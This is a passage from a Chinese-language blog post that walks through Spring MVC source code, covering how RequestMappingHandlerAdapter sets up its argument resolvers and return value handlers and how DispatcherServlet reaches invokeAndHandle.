(<span class="hljs-built_in">this</span>.argumentResolvers != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//&lt;-----关注点</span><br>            invocableMethod.setHandlerMethodArgumentResolvers(<span class="hljs-built_in">this</span>.argumentResolvers);<br>        &#125;<br>        <br>        ...<br></code></pre></td></tr></table></figure><p><code>this.argumentResolvers</code>在<code>afterPropertiesSet()</code>方法内初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestMappingHandlerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanFactoryAware</span>, InitializingBean &#123;<br><br>    <span class="hljs-meta">@Nullable</span><br>    <span class="hljs-keyword">private</span> HandlerMethodArgumentResolverComposite argumentResolvers;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterPropertiesSet</span><span class="hljs-params">()</span> &#123;<br>        ...<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.argumentResolvers == <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//初始化argumentResolvers</span><br>        List&lt;HandlerMethodArgumentResolver&gt; resolvers = getDefaultArgumentResolvers();<br>            <span class="hljs-built_in">this</span>.argumentResolvers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandlerMethodArgumentResolverComposite</span>().addResolvers(resolvers);<br>        &#125;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">//初始化了一堆的实现HandlerMethodArgumentResolver接口的</span><br><span class="hljs-keyword">private</span> List&lt;HandlerMethodArgumentResolver&gt; <span class="hljs-title function_">getDefaultArgumentResolvers</span><span class="hljs-params">()</span> &#123;<br>List&lt;HandlerMethodArgumentResolver&gt; resolvers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(<span class="hljs-number">30</span>);<br><br><span class="hljs-comment">// Annotation-based argument resolution</span><br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestParamMethodArgumentResolver</span>(getBeanFactory(), <span class="hljs-literal">false</span>));<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestParamMapMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PathVariableMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PathVariableMapMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MatrixVariableMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MatrixVariableMapMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletModelAttributeMethodProcessor</span>(<span class="hljs-literal">false</span>));<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestResponseBodyMethodProcessor</span>(getMessageConverters(), <span class="hljs-built_in">this</span>.requestResponseBodyAdvice));<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestPartMethodArgumentResolver</span>(getMessageConverters(), <span class="hljs-built_in">this</span>.requestResponseBodyAdvice));<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestHeaderMethodArgumentResolver</span>(getBeanFactory()));<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestHeaderMapMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletCookieValueMethodArgumentResolver</span>(getBeanFactory()));<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ExpressionValueMethodArgumentResolver</span>(getBeanFactory()));<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SessionAttributeMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestAttributeMethodArgumentResolver</span>());<br><br><span class="hljs-comment">// Type-based argument resolution</span><br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRequestMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletResponseMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntityMethodProcessor</span>(getMessageConverters(), <span class="hljs-built_in">this</span>.requestResponseBodyAdvice));<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RedirectAttributesMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelMethodProcessor</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MapMethodProcessor</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorsMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SessionStatusMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">UriComponentsBuilderMethodArgumentResolver</span>());<br><span class="hljs-keyword">if</span> (KotlinDetector.isKotlinPresent()) &#123;<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ContinuationHandlerMethodArgumentResolver</span>());<br>&#125;<br><br><span class="hljs-comment">// Custom arguments</span><br><span class="hljs-keyword">if</span> (getCustomArgumentResolvers() != <span class="hljs-literal">null</span>) &#123;<br>resolvers.addAll(getCustomArgumentResolvers());<br>&#125;<br><br><span class="hljs-comment">// Catch-all</span><br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrincipalMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestParamMethodArgumentResolver</span>(getBeanFactory(), <span class="hljs-literal">true</span>));<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletModelAttributeMethodProcessor</span>(<span class="hljs-literal">true</span>));<br><br><span class="hljs-keyword">return</span> resolvers;<br>&#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><code>HandlerMethodArgumentResolverComposite</code>类如下：（众多<strong>参数解析器argumentResolvers</strong>的包装类）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HandlerMethodArgumentResolverComposite</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodArgumentResolver</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;HandlerMethodArgumentResolver&gt; argumentResolvers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <br>    ...<br>    <br><span class="hljs-keyword">public</span> HandlerMethodArgumentResolverComposite <span class="hljs-title function_">addResolvers</span><span class="hljs-params">(</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> HandlerMethodArgumentResolver... resolvers)</span> &#123;<br><br><span class="hljs-keyword">if</span> (resolvers != <span class="hljs-literal">null</span>) &#123;<br>Collections.addAll(<span class="hljs-built_in">this</span>.argumentResolvers, resolvers);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>&#125;<br>    <br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>我们看看<code>HandlerMethodArgumentResolver</code>的源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">HandlerMethodArgumentResolver</span> &#123;<br><br>    <span class="hljs-comment">//当前解析器是否支持解析这种参数</span><br><span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsParameter</span><span class="hljs-params">(MethodParameter parameter)</span>;<br><br><span class="hljs-meta">@Nullable</span><span class="hljs-comment">//如果支持，就调用 resolveArgument</span><br>Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(MethodParameter parameter, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">NativeWebRequest webRequest, <span class="hljs-meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="返回值处理器"><a href="#返回值处理器" class="headerlink" title="返回值处理器"></a>返回值处理器</h3><p><strong>ValueHandler</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">invokeHandlerMethod</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">                                           HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    <span class="hljs-type">ServletWebRequest</span> <span class="hljs-variable">webRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletWebRequest</span>(request, response);<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">WebDataBinderFactory</span> <span class="hljs-variable">binderFactory</span> <span class="hljs-operator">=</span> getDataBinderFactory(handlerMethod);<br>        <span class="hljs-type">ModelFactory</span> <span class="hljs-variable">modelFactory</span> <span class="hljs-operator">=</span> getModelFactory(handlerMethod, binderFactory);<br><br>        <span class="hljs-type">ServletInvocableHandlerMethod</span> <span class="hljs-variable">invocableMethod</span> <span class="hljs-operator">=</span> createInvocableHandlerMethod(handlerMethod);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.argumentResolvers != <span class="hljs-literal">null</span>) &#123;<br>            invocableMethod.setHandlerMethodArgumentResolvers(<span class="hljs-built_in">this</span>.argumentResolvers);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.returnValueHandlers != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//&lt;---关注点</span><br>            invocableMethod.setHandlerMethodReturnValueHandlers(<span class="hljs-built_in">this</span>.returnValueHandlers);<br>        &#125;<br>     ...<br><br></code></pre></td></tr></table></figure><p><code>this.returnValueHandlers</code>在<code>afterPropertiesSet()</code>方法内初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestMappingHandlerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanFactoryAware</span>, InitializingBean &#123;<br><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">private</span> HandlerMethodReturnValueHandlerComposite returnValueHandlers;<br>    <br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterPropertiesSet</span><span class="hljs-params">()</span> &#123;<br><br>        ...<br>        <br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.returnValueHandlers == <span class="hljs-literal">null</span>) &#123;<br>List&lt;HandlerMethodReturnValueHandler&gt; handlers = getDefaultReturnValueHandlers();<br><span class="hljs-built_in">this</span>.returnValueHandlers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandlerMethodReturnValueHandlerComposite</span>().addHandlers(handlers);<br>&#125;<br>&#125;<br>    <br>    <span class="hljs-comment">//初始化了一堆的实现HandlerMethodReturnValueHandler接口的</span><br>    <span class="hljs-keyword">private</span> List&lt;HandlerMethodReturnValueHandler&gt; <span class="hljs-title function_">getDefaultReturnValueHandlers</span><span class="hljs-params">()</span> &#123;<br>List&lt;HandlerMethodReturnValueHandler&gt; handlers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(<span class="hljs-number">20</span>);<br><br><span class="hljs-comment">// Single-purpose return value types</span><br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndViewMethodReturnValueHandler</span>());<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelMethodProcessor</span>());<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ViewMethodReturnValueHandler</span>());<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseBodyEmitterReturnValueHandler</span>(getMessageConverters(),<br><span class="hljs-built_in">this</span>.reactiveAdapterRegistry, <span class="hljs-built_in">this</span>.taskExecutor, <span class="hljs-built_in">this</span>.contentNegotiationManager));<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamingResponseBodyReturnValueHandler</span>());<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntityMethodProcessor</span>(getMessageConverters(),<br><span class="hljs-built_in">this</span>.contentNegotiationManager, <span class="hljs-built_in">this</span>.requestResponseBodyAdvice));<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeadersReturnValueHandler</span>());<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CallableMethodReturnValueHandler</span>());<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DeferredResultMethodReturnValueHandler</span>());<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AsyncTaskMethodReturnValueHandler</span>(<span class="hljs-built_in">this</span>.beanFactory));<br><br><span class="hljs-comment">// Annotation-based return value types</span><br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletModelAttributeMethodProcessor</span>(<span class="hljs-literal">false</span>));<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestResponseBodyMethodProcessor</span>(getMessageConverters(),<br><span class="hljs-built_in">this</span>.contentNegotiationManager, <span class="hljs-built_in">this</span>.requestResponseBodyAdvice));<br><br><span class="hljs-comment">// Multi-purpose return value types</span><br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ViewNameMethodReturnValueHandler</span>());<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MapMethodProcessor</span>());<br><br><span class="hljs-comment">// Custom return value types</span><br><span class="hljs-keyword">if</span> (getCustomReturnValueHandlers() != <span class="hljs-literal">null</span>) &#123;<br>handlers.addAll(getCustomReturnValueHandlers());<br>&#125;<br><br><span class="hljs-comment">// Catch-all</span><br><span class="hljs-keyword">if</span> (!CollectionUtils.isEmpty(getModelAndViewResolvers())) &#123;<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndViewResolverMethodReturnValueHandler</span>(getModelAndViewResolvers()));<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletModelAttributeMethodProcessor</span>(<span class="hljs-literal">true</span>));<br>&#125;<br><br><span class="hljs-keyword">return</span> handlers;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>HandlerMethodReturnValueHandlerComposite</code>类如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HandlerMethodReturnValueHandlerComposite</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodReturnValueHandler</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;HandlerMethodReturnValueHandler&gt; returnValueHandlers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>    ...<br>    <br><span class="hljs-keyword">public</span> HandlerMethodReturnValueHandlerComposite <span class="hljs-title function_">addHandlers</span><span class="hljs-params">(</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> List&lt;? extends HandlerMethodReturnValueHandler&gt; handlers)</span> &#123;<br><br><span class="hljs-keyword">if</span> (handlers != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-built_in">this</span>.returnValueHandlers.addAll(handlers);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>HandlerMethodReturnValueHandler</code>接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">HandlerMethodReturnValueHandler</span> &#123;<br><br><span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsReturnType</span><span class="hljs-params">(MethodParameter returnType)</span>;<br><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">handleReturnValue</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Object returnValue, MethodParameter returnType,</span><br><span class="hljs-params">ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="hljs-keyword">throws</span> Exception;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="回顾执行目标方法"><a href="#回顾执行目标方法" class="headerlink" title="回顾执行目标方法"></a>回顾执行目标方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FrameworkServlet</span> &#123;<br>    ...<br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>...<br>        mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br></code></pre></td></tr></table></figure><p><code>RequestMappingHandlerAdapter</code>的<code>handle()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestMappingHandlerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanFactoryAware</span>, InitializingBean &#123;<br><br>    ...<br>    <br>    <span class="hljs-comment">//AbstractHandlerMethodAdapter类的方法，RequestMappingHandlerAdapter继承AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> ModelAndView <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span><br>        <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-keyword">return</span> handleInternal(request, response, (HandlerMethod) handler);<br>    &#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">handleInternal</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    ModelAndView mav;<br>        <span class="hljs-comment">//handleInternal的核心</span><br>        mav = invokeHandlerMethod(request, response, handlerMethod);<span class="hljs-comment">//解释看下节</span><br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">return</span> mav;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>RequestMappingHandlerAdapter</code>的<code>invokeHandlerMethod()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestMappingHandlerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanFactoryAware</span>, InitializingBean &#123;<br>    <br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">invokeHandlerMethod</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">ServletWebRequest</span> <span class="hljs-variable">webRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletWebRequest</span>(request, response);<br><span class="hljs-keyword">try</span> &#123;<br>...<br>            <br>            <span class="hljs-type">ServletInvocableHandlerMethod</span> <span class="hljs-variable">invocableMethod</span> <span class="hljs-operator">=</span> createInvocableHandlerMethod(handlerMethod);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.argumentResolvers != <span class="hljs-literal">null</span>) &#123;<br>invocableMethod.setHandlerMethodArgumentResolvers(<span class="hljs-built_in">this</span>.argumentResolvers);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.returnValueHandlers != <span class="hljs-literal">null</span>) &#123;<br>invocableMethod.setHandlerMethodReturnValueHandlers(<span class="hljs-built_in">this</span>.returnValueHandlers);<br>&#125;<br>...<br><br>            <span class="hljs-comment">//关注点：执行目标方法</span><br>invocableMethod.invokeAndHandle(webRequest, mavContainer);<br><span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> getModelAndView(mavContainer, modelFactory, webRequest);<br>&#125;<br><span class="hljs-keyword">finally</span> &#123;<br>webRequest.requestCompleted();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>invokeAndHandle()</code>方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletInvocableHandlerMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InvocableHandlerMethod</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeAndHandle</span><span class="hljs-params">(ServletWebRequest webRequest, ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> invokeForRequest(webRequest, mavContainer, providedArgs);<br><br>        ...<br>        <br><span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//returnValue存储起来</span><br><span class="hljs-built_in">this</span>.returnValueHandlers.handleReturnValue(<br>returnValue, 